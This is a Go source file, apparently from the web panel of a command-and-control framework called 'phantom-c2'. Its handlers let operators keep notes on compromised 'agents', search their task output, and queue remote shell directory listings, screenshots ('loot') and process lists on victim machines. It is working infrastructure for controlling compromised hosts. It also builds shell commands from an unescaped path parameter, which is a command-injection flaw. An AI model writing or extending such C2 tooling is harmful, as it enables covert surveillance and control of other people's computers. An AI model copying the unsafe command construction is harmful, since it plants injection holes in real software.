package webui

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/phantom-c2/phantom/internal/protocol"
)

// ══════════════════════════════════════════
//  AGENT NOTES
// ══════════════════════════════════════════

var (
	agentNotes   = make(map[string][]AgentNote) // agentID -> notes
	agentNotesMu sync.RWMutex
)

type AgentNote struct {
	Author    string `json:"author"`
	Text      string `json:"text"`
	Timestamp string `json:"timestamp"`
}

func (w *WebUI) handleAgentNotes(rw http.ResponseWriter, r *http.Request) {
	agentRef := r.URL.Query().Get("agent")
	if agentRef == "" {
		writeJSON(rw, map[string]string{"error": "agent parameter required"})
		return
	}

	agent, _ := w.server.AgentMgr.Get(agentRef)
	if agent == nil {
		writeJSON(rw, map[string]string{"error": "agent not found"})
		return
	}

	if r.Method == "GET" {
		agentNotesMu.RLock()
		notes := agentNotes[agent.ID]
		agentNotesMu.RUnlock()
		if notes == nil {
			notes = []AgentNote{}
		}
		writeJSON(rw, notes)
		return
	}

	// POST — add note
	var req struct {
		Text   string `json:"text"`
		Author string `json:"author"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	if req.Author == "" {
		session := w.auth.ValidateRequest(r)
		if session != nil {
			req.Author = session.Username
		} else {
			req.Author = "operator"
		}
	}

	note := AgentNote{
		Author:    req.Author,
		Text:      req.Text,
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
	}

	agentNotesMu.Lock()
	agentNotes[agent.ID] = append(agentNotes[agent.ID], note)
	agentNotesMu.Unlock()

	writeJSON(rw, map[string]string{"status": "added"})
}

// ══════════════════════════════════════════
//  TASK OUTPUT SEARCH
// ══════════════════════════════════════════

func (w *WebUI) handleSearchOutput(rw http.ResponseWriter, r *http.Request) {
	query := r.URL.Query().Get("q")
	if query == "" {
		writeJSON(rw, []interface{}{})
		return
	}

	queryLower := strings.ToLower(query)
	agents, _ := w.server.AgentMgr.List()

	type SearchResult struct {
		Agent   string `json:"agent"`
		TaskID  string `json:"task_id"`
		Type    string `json:"type"`
		Command string `json:"command"`
		Output  string `json:"output"`
		Time    string `json:"time"`
	}

	var results []SearchResult
	for _, a := range agents {
		tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)
		for _, t := range tasks {
			result, _ := w.server.TaskDisp.GetResult(t.ID)
			if result == nil {
				continue
			}

			output := string(result.Output)
			argsStr := strings.Join(t.Args, " ")

			// Search in output and command
			if strings.Contains(strings.ToLower(output), queryLower) ||
				strings.Contains(strings.ToLower(argsStr), queryLower) {

				// Truncate output for display
				displayOutput := output
				if len(displayOutput) > 500 {
					displayOutput = displayOutput[:500] + "..."
				}

				results = append(results, SearchResult{
					Agent:   a.Name,
					TaskID:  t.ID[:8],
					Type:    protocol.TaskTypeName(uint8(t.Type)),
					Command: argsStr,
					Output:  displayOutput,
					Time:    t.CreatedAt.Format("15:04:05"),
				})
			}
		}
	}

	if results == nil {
		results = []SearchResult{}
	}
	writeJSON(rw, results)
}

// ══════════════════════════════════════════
//  ONLINE OPERATORS
// ══════════════════════════════════════════

func (w *WebUI) handleOperators(rw http.ResponseWriter, r *http.Request) {
	operators := w.auth.GetOnlineOperators()
	if operators == nil {
		operators = []string{}
	}
	writeJSON(rw, operators)
}

// ══════════════════════════════════════════
//  FILE BROWSER (sends task to agent)
// ══════════════════════════════════════════

func (w *WebUI) handleFileBrowser(rw http.ResponseWriter, r *http.Request) {
	agentRef := r.URL.Query().Get("agent")
	path := r.URL.Query().Get("path")

	if agentRef == "" {
		writeJSON(rw, map[string]string{"error": "agent parameter required"})
		return
	}

	agent, _ := w.server.AgentMgr.Get(agentRef)
	if agent == nil {
		writeJSON(rw, map[string]string{"error": "agent not found"})
		return
	}

	if path == "" {
		if agent.OS == "windows" {
			path = "C:\\"
		} else {
			path = "/"
		}
	}

	// Queue a directory listing command
	var cmd string
	if agent.OS == "windows" {
		cmd = fmt.Sprintf("dir \"%s\"", path)
	} else {
		cmd = fmt.Sprintf("ls -la %s", path)
	}

	task, err := w.server.TaskDisp.CreateTask(agent.ID, protocol.TaskShell, []string{cmd}, nil)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(rw, map[string]string{
		"status":  "queued",
		"task_id": task.ID,
		"path":    path,
		"message": "Directory listing queued. Check results in a few seconds.",
	})
}

// ══════════════════════════════════════════
//  SCREENSHOT VIEWER
// ══════════════════════════════════════════

func (w *WebUI) handleScreenshotRequest(rw http.ResponseWriter, r *http.Request) {
	agentRef := r.URL.Query().Get("agent")
	if agentRef == "" {
		writeJSON(rw, map[string]string{"error": "agent parameter required"})
		return
	}

	agent, _ := w.server.AgentMgr.Get(agentRef)
	if agent == nil {
		writeJSON(rw, map[string]string{"error": "agent not found"})
		return
	}

	task, err := w.server.TaskDisp.CreateTask(agent.ID, protocol.TaskScreenshot, nil, nil)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(rw, map[string]string{
		"status":  "queued",
		"task_id": task.ID,
		"message": "Screenshot requested. Check loot when the agent checks in.",
	})
}

// ══════════════════════════════════════════
//  PROCESS BROWSER
// ══════════════════════════════════════════

func (w *WebUI) handleProcessList(rw http.ResponseWriter, r *http.Request) {
	agentRef := r.URL.Query().Get("agent")
	if agentRef == "" {
		writeJSON(rw, map[string]string{"error": "agent parameter required"})
		return
	}

	agent, _ := w.server.AgentMgr.Get(agentRef)
	if agent == nil {
		writeJSON(rw, map[string]string{"error": "agent not found"})
		return
	}

	task, err := w.server.TaskDisp.CreateTask(agent.ID, protocol.TaskProcessList, nil, nil)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(rw, map[string]string{
		"status":  "queued",
		"task_id": task.ID,
		"message": "Process list requested. Results on next check-in.",
	})
}

